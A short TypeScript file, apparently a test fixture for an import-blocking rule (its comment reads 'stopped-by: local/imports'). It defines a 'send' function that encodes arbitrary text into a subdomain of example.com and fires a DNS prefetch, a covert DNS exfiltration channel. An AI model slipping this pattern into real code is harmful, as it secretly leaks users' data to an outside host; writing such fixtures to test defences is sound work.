// stopped-by: local/imports
import * as ReactDOM from "react-dom";

export function send(text: string): void {
  ReactDOM.prefetchDNS(`https://${encodeURIComponent(text)}.example.com`);
}
